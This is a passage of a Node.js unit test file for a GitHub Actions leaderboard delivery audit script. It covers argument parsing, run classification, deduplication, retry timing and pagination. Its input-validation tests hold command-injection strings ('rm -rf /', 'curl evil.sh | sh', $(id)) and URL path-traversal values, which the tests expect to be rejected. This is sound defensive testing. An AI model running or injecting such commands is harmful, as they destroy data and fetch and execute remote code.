// Unit tests for the leaderboard delivery audit (ENG-5689).
//
// Node built-ins only — `node:test` + `node:assert/strict`. No npm install, no
// network, no fixtures directory, matching the dependency-free constraint that
// made audit-delivery.mjs a .mjs in the first place (public-workflows has no
// package.json and no node tooling).
//
// SCOPE: the pure, exported surface — parseArgs, classify, dedupeByHead,
// replayList, renderMarkdown, buildReport. The networking layer (makeClient,
// runsInRange, auditRepo) is deliberately untested here: it was validated
// against the live GitHub API and reproduces a known real outage exactly
// (guard 1419/1052/183/5/179, palatine 384/310/1/0/73). Mocking `fetch` to
// re-assert that would test the mock, not the API.
//
// EVERY expectation below is an independently-derived literal. Nothing is
// computed by calling the code under test, so each assertion can actually fail:
// the `since` dates are hand-computed calendar arithmetic, the FAILED
// membership is spelled out, and the sort fixtures are chosen so that both
// "no sort" and "lexicographic sort" produce a different answer than the
// numeric sort that is required.

import test from 'node:test';
import assert from 'node:assert/strict';

import {
  parseArgs,
  classify,
  dedupeByHead,
  replayList,
  renderMarkdown,
  buildReport,
  retryDelayMs,
  runsInRange,
  assertReadable,
  verifyPayloads,
  applyPayloadVerdicts,
  SQS_STEP,
  chunk,
  REPLAY_BATCH,
  FAILED,
  GRACE_MS,
  RETRY_STATUS,
  API_CAP,
  SLICE_MAX,
} from './audit-delivery.mjs';

// ── helpers ──────────────────────────────────────────────────────────────────

// Injected clock for every parseArgs date test. 2026-08-04T12:00:00Z.
const NOW = Date.UTC(2026, 7, 4, 12, 0, 0);

const pr = (number, mergedAt, sha) => ({
  number,
  merged_at: mergedAt,
  head: { sha },
});

const run = (id, headSha, conclusion, createdAt) => ({
  id,
  head_sha: headSha,
  conclusion,
  created_at: createdAt,
});

// A repo result in the shape auditRepo() returns, which is what buildReport
// consumes.
const repoResult = (repo, { merged = 0, ...counts } = {}) => ({
  repo,
  onboarded: null,
  has_caller: true,
  merged_prs: merged,
  classes: {
    delivered: counts.delivered ?? [],
    failed: counts.failed ?? [],
    skipped_anomaly: counts.skipped_anomaly ?? [],
    never_fired: counts.never_fired ?? [],
    pre_onboarding: counts.pre_onboarding ?? [],
    in_flight: counts.in_flight ?? [],
    payload_missing: counts.payload_missing ?? [],
  },
});

const rec = (n) => ({ number: n });

// ── parseArgs ────────────────────────────────────────────────────────────────

test('parseArgs: --days derives since by subtracting whole days from the injected now', () => {
  // 2026-08-04 minus 30 days: 4 days back to 2026-07-31, then 26 more to
  // 2026-07-05. Hand-computed, not derived from the code under test.
  assert.equal(parseArgs(['--days=30'], NOW).since, '2026-07-05');
  // Also exercise the default (DEFAULTS.days === '30') with no flag at all.
  assert.equal(parseArgs([], NOW).since, '2026-07-05');
  // 1 day back from 2026-08-04 is 2026-08-03.
  assert.equal(parseArgs(['--days=1'], NOW).since, '2026-08-03');
  // 216 days back crosses the year boundary: 2026-08-04 → 2025-12-31.
  // (31 Aug-remainder is not how this works — count months: Aug 4 -4 = Jul 31,
  // -31 = Jun 30, -30 = May 31, -31 = Apr 30, -30 = Mar 31, -31 = Feb 28,
  // -28 = Jan 31, -31 = Dec 31 2025. Total 4+31+30+31+30+31+28+31 = 216.)
  assert.equal(parseArgs(['--days=216'], NOW).since, '2025-12-31');
});

test('parseArgs: accepts a space-separated value as well as --flag=value', () => {
  assert.equal(parseArgs(['--days', '30'], NOW).since, '2026-07-05');
  assert.equal(parseArgs(['--days', '1'], NOW).since, '2026-08-03');
});

test('parseArgs: an explicit --since wins over --days, in either order', () => {
  assert.equal(parseArgs(['--since=2026-01-01', '--days=5'], NOW).since, '2026-01-01');
  assert.equal(parseArgs(['--days=5', '--since=2026-01-01'], NOW).since, '2026-01-01');
  // Guard against the inverse: with --days=5 alone the answer would be
  // 2026-07-30, so the assertions above are genuinely about precedence.
  assert.equal(parseArgs(['--days=5'], NOW).since, '2026-07-30');
});

test('parseArgs: rejects a --since that is not YYYY-MM-DD', () => {
  for (const bad of ['2026-1-1', '26-01-01', '2026/01/01', '2026-01-01T00:00:00Z', 'yesterday']) {
    assert.throws(
      () => parseArgs([`--since=${bad}`], NOW),
      /--since must be YYYY-MM-DD/,
      `expected --since=${bad} to be rejected`,
    );
  }
  // The valid shape must NOT throw, or the test above would pass vacuously
  // against a parser that rejects everything.
  assert.equal(parseArgs(['--since=2026-01-01'], NOW).since, '2026-01-01');
});

test('parseArgs: rejects --days=0, negatives, and non-integers', () => {
  for (const bad of ['0', '-1', '1.5', 'abc', '']) {
    assert.throws(
      () => parseArgs([`--days=${bad}`], NOW),
      /--days must be a positive integer/,
      `expected --days=${bad} to be rejected`,
    );
  }
  // Positive integers still pass.
  assert.equal(parseArgs(['--days=7'], NOW).since, '2026-07-28');
});

test('parseArgs: rejects an unknown flag instead of silently ignoring it', () => {
  assert.throws(() => parseArgs(['--nope=1'], NOW), /unknown flag --nope/);
  // A typo'd real flag is the case that actually bites: a silently-ignored
  // --callerpath would audit the DEFAULT workflow and report phantom gaps.
  assert.throws(() => parseArgs(['--callerpath=x.yml'], NOW), /unknown flag --callerpath/);
});

test('parseArgs: rejects a flag given without a value', () => {
  assert.throws(() => parseArgs(['--days'], NOW), /--days requires a value/);
});

test('parseArgs: rejects --repo and --repos together', () => {
  assert.throws(
    () => parseArgs(['--repo=praetorian-inc/guard', '--repos=guard,palatine'], NOW),
    /--repo and --repos are mutually exclusive/,
  );
});

test('parseArgs: rejects a --repo that is not owner/name', () => {
  for (const bad of ['guard', 'praetorian-inc/', '/guard', 'a/b/c', 'owner name/repo']) {
    assert.throws(
      () => parseArgs([`--repo=${bad}`], NOW),
      /--repo must be owner\/name/,
      `expected --repo=${bad} to be rejected`,
    );
  }
  // The valid shape must NOT throw.
  assert.equal(parseArgs(['--repo=praetorian-inc/guard'], NOW).repo, 'praetorian-inc/guard');
});

test('parseArgs: kebab-case flags set their camelCase keys', () => {
  const cfg = parseArgs(
    [
      '--caller-path=.github/workflows/custom-metrics.yml',
      '--backfill-caller=custom-backfill.yml',
    ],
    NOW,
  );
  assert.equal(cfg.callerPath, '.github/workflows/custom-metrics.yml');
  assert.equal(cfg.backfillCaller, 'custom-backfill.yml');
  // The kebab spelling must not survive as its own key — that would mean the
  // script read the default while the operator thought they had overridden it.
  assert.equal('caller-path' in cfg, false);
  assert.equal('backfill-caller' in cfg, false);
});

test('parseArgs: callerFile tracks the basename of callerPath', () => {
  // This is load-bearing: /actions/workflows/{file}/runs is keyed by FILENAME.
  // A hardcoded callerFile would query the wrong workflow and report every
  // merged PR as never_fired.
  assert.equal(parseArgs([], NOW).callerFile, 'leaderboard-metrics.yml');
  assert.equal(
    parseArgs(['--caller-path=.github/workflows/renamed-caller.yml'], NOW).callerFile,
    'renamed-caller.yml',
  );
  assert.equal(
    parseArgs(['--caller-path=a/b/c/d/deeply-nested.yml'], NOW).callerFile,
    'deeply-nested.yml',
  );
  // A bare filename with no directory component is its own basename.
  assert.equal(parseArgs(['--caller-path=bare.yml'], NOW).callerFile, 'bare.yml');
});

test('parseArgs: a callerPath basename that would re-target the API URL is rejected', () => {
  // callerFile is interpolated into /actions/workflows/{file}/runs UNENCODED, so
  // a basename carrying path syntax does not query a differently-named workflow
  // — it queries a different ENDPOINT, and whatever that returns is then treated
  // as this caller's run history. Each case below is chosen because it survives
  // `.split('/').pop()` and still changes the request:
  for (const bad of [
    '..',                       // walks up out of /workflows
    '..%2fruns',                // encoded traversal the server decodes
    'x.yml?per_page=1',         // smuggles a query parameter
    'x.yml#frag',               // truncates the path at the fragment
    'x.yml/../../secrets',      // rejoins a different resource
    'not-a-workflow',           // no yaml suffix: not a workflow file at all
    '',                         // a trailing slash yields an empty basename
    'sp ace.yml',               // an unencoded space is not a legal URL path
  ]) {
    assert.throws(
      () => parseArgs([`--caller-path=.github/workflows/${bad}`], NOW),
      /--caller-path/,
      `--caller-path=${JSON.stringify(bad)} must be rejected`,
    );
  }

  // And the legitimate shapes still pass, so the guard is not just "throws".
  // (An uppercase `.YML` is deliberately NOT in this list: Actions only
  // recognizes lowercase .yml/.yaml, so such a file is not a workflow.)
  for (const ok of ['leaderboard-metrics.yml', 'a_b.c-d.yaml', 'Mixed-Case.yml']) {
    assert.equal(parseArgs([`--caller-path=.github/workflows/${ok}`], NOW).callerFile, ok);
  }
});

test('parseArgs: a backfillCaller carrying shell metacharacters is rejected', () => {
  // backfillCaller is interpolated into the `gh workflow run` line the report
  // tells a HUMAN to paste into a shell. The report is read by someone
  // responding to a delivery alert, which is the worst possible moment to be
  // handed a command that does something other than what it appears to.
  for (const bad of [
    'x.yml; rm -rf /',
    'x.yml && curl evil.sh | sh',
    'x.yml`id`',
    'x.yml$(id)',
    "x.yml' --repo other/repo '",
    '$IFS.yml',
    'no-suffix',
  ]) {
    assert.throws(
      () => parseArgs([`--backfill-caller=${bad}`], NOW),
      /--backfill-caller/,
      `--backfill-caller=${JSON.stringify(bad)} must be rejected`,
    );
  }

  assert.equal(
    parseArgs(['--backfill-caller=leaderboard-backfill.yaml'], NOW).backfillCaller,
    'leaderboard-backfill.yaml',
  );
});

test('parseArgs: --repo turns on self-audit and splits owner/name', () => {
  const cfg = parseArgs(['--repo=praetorian-inc/guard'], NOW);
  assert.equal(cfg.selfAudit, true);
  assert.equal(cfg.owner, 'praetorian-inc');
  assert.deepEqual(cfg.repos, ['guard']);
});

test('parseArgs: fleet mode leaves selfAudit false', () => {
  assert.equal(parseArgs([], NOW).selfAudit, false);
  assert.equal(parseArgs(['--repos=guard,palatine'], NOW).selfAudit, false);
});

test('parseArgs: --repos is split, trimmed, and emptied entries dropped', () => {
  assert.deepEqual(parseArgs(['--repos=guard, palatine ,,nerva'], NOW).repos, [
    'guard',
    'palatine',
    'nerva',
  ]);
});

// ── classify ─────────────────────────────────────────────────────────────────

test('classify: a successful run for the PR head is delivered', () => {
  const prs = [pr(1, '2026-07-01T00:00:00Z', 'aaaaaaaabbbbbbbb')];
  const byHead = new Map([['aaaaaaaabbbbbbbb', run(555, 'aaaaaaaabbbbbbbb', 'success', '2026-07-01T01:00:00Z')]]);

  const c = classify(prs, byHead, null);

  assert.deepEqual(c.delivered.map((r) => r.number), [1]);
  assert.deepEqual(c.failed, []);
  assert.deepEqual(c.never_fired, []);
  assert.deepEqual(c.skipped_anomaly, []);
  assert.deepEqual(c.pre_onboarding, []);
  // The record carries the run identity and an 8-char head SHA for the report.
  assert.equal(c.delivered[0].run_id, 555);
  assert.equal(c.delivered[0].conclusion, 'success');
  assert.equal(c.delivered[0].head_sha, 'aaaaaaaa');
  assert.equal(c.delivered[0].merged_at, '2026-07-01T00:00:00Z');
});

test('classify: every FAILED conclusion lands in failed', () => {
  // Spelled-out membership, independent of the exported Set. If FAILED were
  // emptied or a member dropped, this reds before the loop below runs.
  assert.deepEqual([...FAILED].sort(), [
    'action_required',
    'cancelled',
    'failure',
    'startup_failure',
    'timed_out',
  ]);

  const conclusions = [...FAILED];
  const prs = conclusions.map((_, i) => pr(100 + i, '2026-07-01T00:00:00Z', `sha${i}`));
  const byHead = new Map(
    conclusions.map((concl, i) => [`sha${i}`, run(i, `sha${i}`, concl, '2026-07-01T01:00:00Z')]),
  );

  const c = classify(prs, byHead, null);

  assert.equal(c.failed.length, conclusions.length);
  assert.deepEqual(
    c.failed.map((r) => r.number),
    conclusions.map((_, i) => 100 + i),
  );
  assert.deepEqual(c.delivered, []);
  assert.deepEqual(c.never_fired, []);
});

test('classify: a skipped run on a MERGED pr is a skipped_anomaly, not a benign skip', () => {
  const prs = [pr(7, '2026-07-01T00:00:00Z', 'deadbeefcafe')];
  const byHead = new Map([['deadbeefcafe', run(9, 'deadbeefcafe', 'skipped', '2026-07-01T01:00:00Z')]]);

  const c = classify(prs, byHead, null);

  assert.deepEqual(c.skipped_anomaly.map((r) => r.number), [7]);
  assert.deepEqual(c.delivered, []);
  assert.deepEqual(c.failed, []);
  assert.deepEqual(c.never_fired, []);
});

test('classify: an UNCONCLUDED run is in_flight — never never_fired, never delivered', () => {
  // The API leaves `conclusion` null for every non-terminal status (queued,
  // in_progress, waiting, requested, pending), so one null fixture covers all of
  // them — that predicate is the whole test. This must NOT be never_fired:
  // never_fired is on the replay list, so an actively running delivery would be
  // recommended for replay. The audit window counts back from *now*, so a PR
  // merged seconds ago is always in range — this is the common case, not a
  // corner one.
  const prs = [pr(11, '2026-07-01T00:00:00Z', 'sha-null')];
  const byHead = new Map([['sha-null', run(1, 'sha-null', null, '2026-07-01T01:00:00Z')]]);

  const c = classify(prs, byHead, null);

  assert.deepEqual(c.in_flight.map((r) => r.number), [11]);
  assert.deepEqual(c.never_fired, []);
  assert.deepEqual(c.delivered, []);
  assert.deepEqual(c.failed, []);
  assert.deepEqual(c.skipped_anomaly, []);
  assert.deepEqual(c.pre_onboarding, []);
  // The run identity is still carried, so the report can name what is running.
  assert.equal(c.in_flight[0].run_id, 1);
  assert.equal(c.in_flight[0].conclusion, null);
});

test('classify: an unrecognized TERMINAL conclusion is failed, not in_flight', () => {
  // `neutral` and `stale` are real conclusions we do not enumerate, and GitHub
  // may add more. They are not `success`, so nothing was delivered — and unlike
  // an unconcluded run they will never change on a later audit. Filing them as
  // in_flight would hide them permanently: neither delivered nor a gap, forever.
  // Fail safe instead — surface them as failed so they are replayable.
  const prs = [
    pr(21, '2026-07-01T00:00:00Z', 'sha-neutral'),
    pr(22, '2026-07-01T00:00:00Z', 'sha-stale'),
    pr(23, '2026-07-01T00:00:00Z', 'sha-future'),
  ];
  const byHead = new Map([
    ['sha-neutral', run(1, 'sha-neutral', 'neutral', '2026-07-01T01:00:00Z')],
    ['sha-stale', run(2, 'sha-stale', 'stale', '2026-07-01T01:00:00Z')],
    ['sha-future', run(3, 'sha-future', 'some_conclusion_invented_later', '2026-07-01T01:00:00Z')],
  ]);

  const c = classify(prs, byHead, null);

  assert.deepEqual(c.failed.map((r) => r.number), [21, 22, 23]);
  assert.deepEqual(c.in_flight, []);
  assert.deepEqual(c.delivered, []);
  assert.deepEqual(c.never_fired, []);
  // The actual value survives onto the record, so the report does not have to
  // pretend it was a `failure`.
  assert.deepEqual(c.failed.map((r) => r.conclusion), ['neutral', 'stale', 'some_conclusion_invented_later']);
});

test('classify: every pr lands in exactly one class, and none are dropped', () => {
  // A conservation check over the whole switch. Written because the in_flight
  // fix added a branch: the failure mode of adding a class is a pr that falls
  // into no bucket at all, which no per-class assertion above would notice.
  const prs = [
    pr(1, '2026-07-20T00:00:00Z', 'ok'),
    pr(2, '2026-07-20T00:00:00Z', 'bad'),
    pr(3, '2026-07-20T00:00:00Z', 'skip'),
    pr(4, '2026-07-20T00:00:00Z', 'gone'),
    pr(5, '2026-07-01T00:00:00Z', 'early'),
    pr(6, '2026-07-20T00:00:00Z', 'running'),
    pr(7, '2026-07-20T00:00:00Z', 'weird'),
  ];
  const byHead = new Map([
    ['ok', run(1, 'ok', 'success', '2026-07-20T01:00:00Z')],
    ['bad', run(2, 'bad', 'failure', '2026-07-20T01:00:00Z')],
    ['skip', run(3, 'skip', 'skipped', '2026-07-20T01:00:00Z')],
    ['running', run(4, 'running', null, '2026-07-20T01:00:00Z')],
    ['weird', run(5, 'weird', 'neutral', '2026-07-20T01:00:00Z')],
  ]);

  const c = classify(prs, byHead, Date.parse('2026-07-10T00:00:00Z'));

  const placed = Object.values(c).flat().map((r) => r.number).sort((a, b) => a - b);
  assert.deepEqual(placed, [1, 2, 3, 4, 5, 6, 7]);
  // Sorting above would hide a pr counted twice, so check the size too.
  assert.equal(placed.length, prs.length);
});

test('classify: a merged pr with no run and no onboarding timestamp is never_fired', () => {
  const prs = [pr(42, '2026-07-01T00:00:00Z', 'orphansha')];

  const c = classify(prs, new Map(), null);

  assert.deepEqual(c.never_fired.map((r) => r.number), [42]);
  assert.deepEqual(c.pre_onboarding, []);
  // No run means no run identity on the record.
  assert.equal('run_id' in c.never_fired[0], false);
  assert.equal('conclusion' in c.never_fired[0], false);
});

test('classify: a JUST-merged pr with no run yet is in_flight, not never_fired', () => {
  // The second half of "the verdict is not knowable yet". GitHub indexes a
  // workflow run a moment AFTER the merge, so a PR merged seconds ago has no run
  // row — symptom-identical to never_fired, opposite meaning. Calling it
  // never_fired puts a delivery that is about to happen on the replay list, and
  // replaying re-writes to the prod metrics queue.
  const merged = '2026-07-20T12:00:00Z';
  const prs = [pr(9, merged, 'freshsha')];
  const mergedTs = Date.parse(merged);

  // One minute after the merge: inside the window.
  const fresh = classify(prs, new Map(), null, mergedTs + 60_000);
  assert.deepEqual(fresh.in_flight.map((r) => r.number), [9]);
  assert.deepEqual(fresh.never_fired, []);

  // A day later: the run was never going to appear.
  const stale = classify(prs, new Map(), null, mergedTs + 24 * 60 * 60 * 1000);
  assert.deepEqual(stale.never_fired.map((r) => r.number), [9]);
  assert.deepEqual(stale.in_flight, []);
});

test('classify: the grace window is half-open at exactly GRACE_MS', () => {
  // `now - merged < GRACE_MS` is strict, so the boundary instant is OUTSIDE the
  // window. Asserted against GRACE_MS rather than a restated 900000 so that
  // retuning the constant cannot silently invalidate the boundary it describes.
  const merged = '2026-07-20T12:00:00Z';
  const prs = [pr(9, merged, 'freshsha')];
  const mergedTs = Date.parse(merged);

  const inside = classify(prs, new Map(), null, mergedTs + GRACE_MS - 1);
  assert.deepEqual(inside.in_flight.map((r) => r.number), [9]);

  const atBoundary = classify(prs, new Map(), null, mergedTs + GRACE_MS);
  assert.deepEqual(atBoundary.never_fired.map((r) => r.number), [9]);
  assert.deepEqual(atBoundary.in_flight, []);

  // And the window is generous enough to cover real run-indexing latency, which
  // is seconds. A window of a few seconds would defeat the purpose.
  assert.ok(GRACE_MS >= 60_000, 'a grace window under a minute cannot absorb indexing latency');
});

test('classify: pre_onboarding OUTRANKS the grace window', () => {
  // A PR merged before the repo had a caller is a policy question forever, and
  // recency does not change that. Order matters: if the grace check ran first, a
  // just-merged PR in a repo onboarded later would be reported as "not yet
  // decided" and then flip to pre_onboarding on the next cycle.
  const merged = '2026-07-20T12:00:00Z';
  const prs = [pr(9, merged, 'freshsha')];
  const mergedTs = Date.parse(merged);

  const c = classify(prs, new Map(), mergedTs + 1000, mergedTs + 60_000);

  assert.deepEqual(c.pre_onboarding.map((r) => r.number), [9]);
  assert.deepEqual(c.in_flight, []);
  assert.deepEqual(c.never_fired, []);
});

test('classify: the grace window does NOT rescue a pr whose run already CONCLUDED', () => {
  // A concluded failure is knowable now, however recent it is. Letting recency
  // suppress it would hide the freshest breakage — exactly the alert with the
  // most value.
  const merged = '2026-07-20T12:00:00Z';
  const prs = [pr(9, merged, 'hasrun')];
  const byHead = new Map([['hasrun', run(1, 'hasrun', 'failure', merged)]]);

  const c = classify(prs, byHead, null, Date.parse(merged) + 60_000);

  assert.deepEqual(c.failed.map((r) => r.number), [9]);
  assert.deepEqual(c.in_flight, []);
});

test('classify: the onboarding boundary splits pre_onboarding from never_fired', () => {
  // ONE pr, no run, evaluated on both sides of onboardedTs. This boundary is
  // what keeps the alert actionable: a PR merged before the repo had a caller
  // never had a delivery path (policy question), whereas one merged after it
  // did is a broken pipeline (alert).
  const merged = '2026-07-10T00:00:00Z';
  const prs = [pr(77, merged, 'boundarysha')];

  // onboarded AFTER the merge → the caller did not exist yet → pre_onboarding.
  const before = classify(prs, new Map(), Date.parse('2026-07-11T00:00:00Z'));
  assert.deepEqual(before.pre_onboarding.map((r) => r.number), [77]);
  assert.deepEqual(before.never_fired, []);

  // onboarded BEFORE the merge → a delivery path existed and produced nothing.
  const after = classify(prs, new Map(), Date.parse('2026-07-09T00:00:00Z'));
  assert.deepEqual(after.never_fired.map((r) => r.number), [77]);
  assert.deepEqual(after.pre_onboarding, []);

  // Exactly equal is NOT "before" — the comparison is strict, so a PR merged
  // at the onboarding instant is a real gap.
  const exact = classify(prs, new Map(), Date.parse(merged));
  assert.deepEqual(exact.never_fired.map((r) => r.number), [77]);
  assert.deepEqual(exact.pre_onboarding, []);
});

test('classify: onboardedTs does not reclassify a pr that HAS a run', () => {
  // pre_onboarding is only reachable through the no-run branch. A pr with a
  // failed run stays failed even if it merged before onboarding.
  const prs = [pr(5, '2026-07-01T00:00:00Z', 'hasrun')];
  const byHead = new Map([['hasrun', run(1, 'hasrun', 'failure', '2026-07-01T01:00:00Z')]]);

  const c = classify(prs, byHead, Date.parse('2026-12-31T00:00:00Z'));

  assert.deepEqual(c.failed.map((r) => r.number), [5]);
  assert.deepEqual(c.pre_onboarding, []);
});

test('classify: all five classes populate from one mixed batch', () => {
  const prs = [
    pr(1, '2026-07-20T00:00:00Z', 'ok'),
    pr(2, '2026-07-20T00:00:00Z', 'bad'),
    pr(3, '2026-07-20T00:00:00Z', 'skip'),
    pr(4, '2026-07-20T00:00:00Z', 'gone'),
    pr(5, '2026-07-01T00:00:00Z', 'early'),
  ];
  const byHead = new Map([
    ['ok', run(1, 'ok', 'success', '2026-07-20T01:00:00Z')],
    ['bad', run(2, 'bad', 'failure', '2026-07-20T01:00:00Z')],
    ['skip', run(3, 'skip', 'skipped', '2026-07-20T01:00:00Z')],
  ]);

  const c = classify(prs, byHead, Date.parse('2026-07-10T00:00:00Z'));

  assert.deepEqual(c.delivered.map((r) => r.number), [1]);
  assert.deepEqual(c.failed.map((r) => r.number), [2]);
  assert.deepEqual(c.skipped_anomaly.map((r) => r.number), [3]);
  assert.deepEqual(c.never_fired.map((r) => r.number), [4]);
  assert.deepEqual(c.pre_onboarding.map((r) => r.number), [5]);
});

// ── dedupeByHead ─────────────────────────────────────────────────────────────

test('dedupeByHead: the latest created_at wins for a shared head_sha, in either input order', () => {
  const first = run(1, 'samesha', 'failure', '2026-07-01T00:00:00Z');
  const rerun = run(2, 'samesha', 'success', '2026-07-02T00:00:00Z');

  // Chronological input.
  const forward = dedupeByHead([first, rerun]);
  assert.equal(forward.size, 1);
  assert.equal(forward.get('samesha').id, 2);
  assert.equal(forward.get('samesha').conclusion, 'success');

  // Reversed input — the API returns runs newest-first, so this is the ordering
  // production actually sees. A naive last-write-wins would keep the failure.
  const reverse = dedupeByHead([rerun, first]);
  assert.equal(reverse.size, 1);
  assert.equal(reverse.get('samesha').id, 2);
  assert.equal(reverse.get('samesha').conclusion, 'success');
});

test('dedupeByHead: distinct head_shas are all kept', () => {
  const byHead = dedupeByHead([
    run(1, 'a', 'success', '2026-07-01T00:00:00Z'),
    run(2, 'b', 'failure', '2026-07-01T00:00:00Z'),
    run(3, 'c', 'skipped', '2026-07-01T00:00:00Z'),
  ]);

  assert.equal(byHead.size, 3);
  assert.deepEqual([...byHead.keys()].sort(), ['a', 'b', 'c']);
  assert.equal(byHead.get('b').id, 2);
});

test('dedupeByHead: an empty run list yields an empty map', () => {
  assert.equal(dedupeByHead([]).size, 0);
});

test('dedupeByHead: a SUCCESS is not displaced by a newer non-success', () => {
  // The direction recency alone got wrong. A delivery that succeeded stays
  // delivered — the consumer holds the row — so re-running it and failing must
  // NOT reclassify the PR as a gap. That would put an already-delivered PR on
  // the replay list and double-deliver it, the one error direction that writes
  // to prod twice rather than not at all.
  const ok = run(1, 'samesha', 'success', '2026-07-01T00:00:00Z');

  for (const later of [
    run(2, 'samesha', 'failure', '2026-07-02T00:00:00Z'),
    run(3, 'samesha', 'cancelled', '2026-07-02T00:00:00Z'),
    run(4, 'samesha', 'skipped', '2026-07-02T00:00:00Z'),
    run(5, 'samesha', null, '2026-07-02T00:00:00Z'), // a re-run still in flight
    run(6, 'samesha', 'neutral', '2026-07-02T00:00:00Z'),
  ]) {
    for (const order of [[ok, later], [later, ok]]) {
      const got = dedupeByHead(order);
      assert.equal(got.size, 1);
      assert.equal(
        got.get('samesha').id,
        1,
        `success (id 1) must win over a later ${later.conclusion} (id ${later.id})`,
      );
    }
  }
});

test('dedupeByHead: among non-successes the latest still wins', () => {
  // Success-first must not flatten the ordering it replaced: with no success
  // anywhere, the newest run is still the one that describes current state.
  const older = run(1, 'samesha', 'failure', '2026-07-01T00:00:00Z');
  const newer = run(2, 'samesha', 'cancelled', '2026-07-03T00:00:00Z');

  assert.equal(dedupeByHead([older, newer]).get('samesha').id, 2);
  assert.equal(dedupeByHead([newer, older]).get('samesha').id, 2);
});

test('dedupeByHead: two successes resolve to the later one', () => {
  const a = run(1, 'samesha', 'success', '2026-07-01T00:00:00Z');
  const b = run(2, 'samesha', 'success', '2026-07-05T00:00:00Z');

  assert.equal(dedupeByHead([a, b]).get('samesha').id, 2);
  assert.equal(dedupeByHead([b, a]).get('samesha').id, 2);
});

// ── retryDelayMs ─────────────────────────────────────────────────────────────

// A minimal Headers stand-in: only .get() is used, and a real Headers would
// lowercase keys anyway.
const hdrs = (o) => ({ get: (k) => (k in o ? String(o[k]) : null) });
const T0 = Date.UTC(2026, 7, 4, 12, 0, 0);

test('retryDelayMs: retry-after seconds is honoured, and it OUTRANKS x-ratelimit-reset', () => {
  // retry-after is the header secondary (abuse) limits send — the limit a
  // paginating audit actually trips. If reset won instead, this would wait 5s
  // when the server asked for 30.
  assert.equal(retryDelayMs(hdrs({ 'retry-after': '30' }), T0), 30000);
  assert.equal(
    retryDelayMs(
      hdrs({ 'retry-after': '30', 'x-ratelimit-reset': String(T0 / 1000 + 5) }),
      T0,
    ),
    30000,
  );
});

test('retryDelayMs: an HTTP-date retry-after is accepted too', () => {
  const when = new Date(T0 + 20000).toUTCString();
  assert.equal(retryDelayMs(hdrs({ 'retry-after': when }), T0), 20000);
});

test('retryDelayMs: a FUTURE x-ratelimit-reset is used when retry-after is absent', () => {
  assert.equal(retryDelayMs(hdrs({ 'x-ratelimit-reset': String(T0 / 1000 + 45) }), T0), 45000);
});

test('retryDelayMs: a missing or PAST reset falls back to the floor, not a negative wait', () => {
  // The old bug: `reset - now` on a missing header is a large NEGATIVE number.
  // Math.max pinned it to the 1s floor, so all four attempts burned in ~3s
  // against a limit that needed a real wait. Same visible value, but now it is
  // the deliberate "nothing usable, fail fast to exit 2" path rather than an
  // arithmetic accident — the tests below pin the cases that used to be
  // indistinguishable from it.
  assert.equal(retryDelayMs(hdrs({}), T0), 1000);
  assert.equal(retryDelayMs(hdrs({ 'x-ratelimit-reset': String(T0 / 1000 - 600) }), T0), 1000);
  assert.equal(retryDelayMs(hdrs({ 'x-ratelimit-reset': '0' }), T0), 1000);
  assert.equal(retryDelayMs(hdrs({ 'retry-after': 'not-a-date' }), T0), 1000);
});

test('RETRY_STATUS covers the transient failures and NOT the deterministic ones', () => {
  // Which statuses are retried decides whether one bad gateway on page 30 of 40
  // discards the other 39 pages of work: an aborted audit is an exit-2 UNKNOWN
  // over the entire repo, not a partial result.
  for (const transient of [403, 429, 500, 502, 503, 504]) {
    assert.ok(RETRY_STATUS.has(transient), `${transient} must be retried`);
  }

  // Retrying these wastes the attempt budget on an answer that will not change,
  // and a 404 in particular is how a mistyped caller filename presents — four
  // attempts make that failure slower to surface, not likelier to succeed.
  for (const deterministic of [400, 401, 404, 409, 422, 501]) {
    assert.equal(RETRY_STATUS.has(deterministic), false, `${deterministic} must NOT be retried`);
  }
});

test('retryDelayMs: the wait is clamped to [1s, 60s]', () => {
  // Unbounded, a reset an hour out would hang the job until its timeout.
  assert.equal(retryDelayMs(hdrs({ 'retry-after': '3600' }), T0), 60000);
  assert.equal(retryDelayMs(hdrs({ 'x-ratelimit-reset': String(T0 / 1000 + 3600) }), T0), 60000);
  assert.equal(retryDelayMs(hdrs({ 'retry-after': '0' }), T0), 1000);
});

// ── runsInRange: slicing and the truncation guard ────────────────────────────

// A stub client. runsInRange already takes `client` as its only route to the
// network, so this fakes nothing about the transport — it just decides what the
// probe and the page fetch report, which is the whole point of the guard.
const RCFG = { owner: 'praetorian-inc', callerFile: 'leaderboard-metrics.yml', since: '2026-07-01' };

const stubClient = (plan) => {
  const seen = { probes: [], pages: [] };
  return {
    seen,
    gh: async (url) => {
      const range = decodeURIComponent(url.match(/created=([^&]+)/)[1]);
      seen.probes.push(range);
      return { total_count: plan.total(range) };
    },
    ghPaged: async (url) => {
      const range = decodeURIComponent(url.match(/created=([^&]+)/)[1]);
      seen.pages.push(range);
      return plan.runs(range);
    },
  };
};

test('runsInRange: a slice that grew between the probe and the fetch is TOLERATED', () => {
  // The probe says 5, the fetch returns 6 because a run was created in between.
  // The last slice always ends at today, so on a repo merging ~15 PRs a day this
  // is ordinary churn. Strict equality made it a spurious exit-2 "audit could
  // not complete" — a false page on the busiest repos.
  const client = stubClient({
    total: () => 5,
    runs: () => Array.from({ length: 6 }, (_, i) => ({ id: i, head_sha: `s${i}` })),
  });

  return runsInRange(client, RCFG, 'guard').then((got) => {
    assert.equal(got.length, 6, 'the extra run is kept — more data, not less');
  });
});

test('runsInRange: a SHORTFALL still throws — truncation is the real danger', () => {
  const client = stubClient({
    total: () => 10,
    runs: () => Array.from({ length: 4 }, (_, i) => ({ id: i, head_sha: `s${i}` })),
  });

  return assert.rejects(
    () => runsInRange(client, RCFG, 'guard'),
    /reported total_count=10 but only 4 runs were retrievable/,
  );
});

test('runsInRange: an exact match passes, and a zero-total slice costs no page fetch', () => {
  const exact = stubClient({
    total: () => 3,
    runs: () => [{ id: 1, head_sha: 'a' }, { id: 2, head_sha: 'b' }, { id: 3, head_sha: 'c' }],
  });
  const empty = stubClient({ total: () => 0, runs: () => [] });

  return Promise.all([
    runsInRange(exact, RCFG, 'guard').then((g) => assert.equal(g.length, 3)),
    runsInRange(empty, RCFG, 'guard').then((g) => {
      assert.deepEqual(g, []);
      assert.equal(empty.seen.pages.length, 0, 'total_count=0 must not fetch pages');
    }),
  ]);
});

test('runsInRange: a slice over the 1000 cap SUBDIVIDES instead of silently truncating', () => {
  // The bug that made 420 delivered guard PRs read as never-fired. Any range
  // spanning more than one day reports over the cap until it is narrow enough.
  let subdivided = 0;
  const client = stubClient({
    total: (range) => {
      const [a, b] = range.split('..');
      if (a === b) return 2; // a single day is under the cap
